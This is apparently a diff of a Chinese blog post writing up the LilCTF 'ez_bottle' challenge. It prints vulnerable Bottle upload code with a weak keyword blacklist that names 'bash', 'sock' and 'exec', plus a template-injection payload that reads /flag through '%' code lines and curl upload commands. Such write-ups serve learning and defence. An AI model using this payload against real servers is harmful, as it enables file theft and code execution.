-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">zip_file</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.zip&#39;</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Invalid file. Please upload a ZIP file.&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">&gt;</span> <span class="n">MAX_FILE_SIZE</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">current_time</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">    <span class="n">unique_string</span> <span class="o">=</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span> <span class="o">+</span> <span class="n">current_time</span>
-</span></span><span class="line"><span class="cl">    <span class="n">md5_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">unique_string</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">extract_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5_hash</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">zip_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">file_info</span> <span class="ow">in</span> <span class="n">z</span><span class="o">.</span><span class="n">infolist</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">is_symlink</span><span class="p">(</span><span class="n">file_info</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;Symbolic links are not allowed.&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                <span class="n">real_dest_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">file_info</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe_path</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">real_dest_path</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;Path traversal detected.&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="n">z</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">BadZipFile</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Invalid ZIP file.&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;文件列表: {{files}}</span><span class="se">\n</span><span class="s2">访问: /view/{{md5}}/{{first_file}}&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">files</span><span class="o">=</span><span class="s2">&#34;, &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">files</span><span class="p">),</span> <span class="n">md5</span><span class="o">=</span><span class="n">md5_hash</span><span class="p">,</span> <span class="n">first_file</span><span class="o">=</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">files</span> <span class="k">else</span> <span class="s2">&#34;nofile&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;File not found.&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;you are hacker!!!nonono!!!&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error rendering template: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error404</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;bbbbbboooottle&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@error</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">error403</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Forbidden: You don&#39;t have permission to access this resource.&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
-</span></span></code></pre></div><p>题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）</p>
-<p>可以看到这里有一个上传的路由<code>/upload</code>,可以用<code>POST</code>方法上传一个<code>zip</code>文件，经过一系列校验没问题后就会把<code>zip</code>文件里的内容渲染到<code>/view/&lt;md5&gt;/&lt;filename&gt;</code>路由。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;File not found.&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;you are hacker!!!nonono!!!&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error rendering template: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><p>可以看到就是渲染的这里出了问题，由于黑名单设置得比较脆弱，会导致如果绕过了拦截，危险代码就会被执行；</p>
-<ul>
-<li>利用方法：</li>
-</ul>
-<p>在Bottle文档中有这样一段话：</p>
-<blockquote>
-<p>The template engine allows you to embed lines or blocks of python code within your template. Code lines start with <code>&lt;span class=&quot;pre&quot;&gt;%&lt;/span&gt;</code> and code blocks are surrounded by <code>&lt;span class=&quot;pre&quot;&gt;&lt;%&lt;/span&gt;</code> and <code>&lt;span class=&quot;pre&quot;&gt;%&gt;&lt;/span&gt;</code> tokens:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">%</span> <span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;Bob&#34;</span>  <span class="c1"># a line of python code</span>
-</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Some</span> <span class="n">plain</span> <span class="n">text</span> <span class="ow">in</span> <span class="n">between</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
-</span></span><span class="line"><span class="cl">  <span class="c1"># A block of python code</span>
-</span></span><span class="line"><span class="cl">  <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">title</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">More</span> <span class="n">plain</span> <span class="n">text</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span></span></code></pre></div><p>`</p></blockquote>
-<p>bottle框架允许嵌入<code>Python</code>代码，代码行以%开头；</p>
-<p>显然%并不在黑名单范围内</p>
-<p>所以可以写<code>Python</code>代码：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">%</span> <span class="kn">import</span> <span class="nn">fileinput</span>
-</span></span><span class="line"><span class="cl"><span class="o">%</span> <span class="n">m</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">fileinput</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="o">%</span> <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
-</span></span></code></pre></div><p>然后打包进<code>zip</code>；由于这里没有办法直接传包，只留了接口，所以用<code>curl</code>传下参（比赛中不知道为什么完全传不上去啊QAQ）</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://gz.imxbt.cn:20568/upload&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -F <span class="s2">&#34;file=@exp.zip;type=application/zip;filename=exp.zip&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://gz.imxbt.cn:20568/upload&#34;</span> -F <span class="s2">&#34;file=@exp.zip;type=application/zip;filename=exp.zip&#34;</span>
-</span></span><span class="line"><span class="cl">文件列表: exp.txt
-</span></span><span class="line"><span class="cl">访问: /view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt
-</span></span></code></pre></div><p>访问<code>http://gz.imxbt.cn:20568/view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt</code>得到flag</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">相关文章</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="">
-    <a href="/p/cve-2024-39907%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">CVE-2024-39907漏洞复现</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/tls-poison-%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TLS Poison 攻击学习</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/cve-2025-55449%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">CVE-2025-55449漏洞复现</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/cve-2025-2945-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">CVE-2025-2945 漏洞复现</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TGCTF知识梳理</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
-
-     
-    
-        
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2024 - 
-        
-        2026 Oight
-    </section>
-    
-    <section class="powerby">
-        
-            Build by Oight <br/>
-        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
-        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
-    </section>
-</footer>
-
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-  <script>
-    (function () {
-      const maxHeight = 420;
-
-      function initCodeFold() {
-        document
-          .querySelectorAll(".article-content .highlight")
-          .forEach(function (block) {
-            if (block.dataset.codeFoldInit === "true") return;
-
-            block.dataset.codeFoldInit = "true";
-
-            if (block.scrollHeight <= maxHeight + 40) return;
-
-            const wrapper = document.createElement("div");
-            wrapper.className = "code-fold-wrapper";
-
-            block.parentNode.insertBefore(wrapper, block);
-            wrapper.appendChild(block);
-
-            block.classList.add("code-collapsible", "code-collapsed");
-
-            const button = document.createElement("button");
-            button.type = "button";
-            button.className = "code-toggle-button";
-            button.textContent = "展开代码";
-            button.setAttribute("aria-expanded", "false");
-
-            button.addEventListener("click", function () {
-              const collapsed = block.classList.toggle("code-collapsed");
-
-              button.textContent = collapsed ? "展开代码" : "收起代码";
-              button.setAttribute("aria-expanded", String(!collapsed));
-            });
-
-            wrapper.appendChild(button);
-          });
-      }
-
-      if (document.readyState === "loading") {
-        document.addEventListener("DOMContentLoaded", initCodeFold);
-      } else {
-        initCodeFold();
-      }
-    })();
-  </script>
-    </body>
-</html>
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals", "get", "open"] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr >> 16) & 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/<filename>&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) > MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template("文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}", files=", ".join(files), md5=md5_hash, first_file=files[0] if files else "nofile") @route(&#39;/view/<md5>/<filename>&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return "File not found." with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return "you are hacker!!!nonono!!!" try: return template(content) except Exception as e: return f"Error rendering template: {str(e)}" @error(404) def error404(error): return "bbbbbboooottle" @error(403) def error403(error): return "Forbidden: You don&#39;t have permission to access this resource." if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n'><title>LilCTF复现</title><link rel=canonical href=https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/><link rel=stylesheet href=/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css><meta property='og:title' content="LilCTF复现"><meta property='og:description' content='LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals", "get", "open"] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr >> 16) & 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/<filename>&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) > MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template("文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}", files=", ".join(files), md5=md5_hash, first_file=files[0] if files else "nofile") 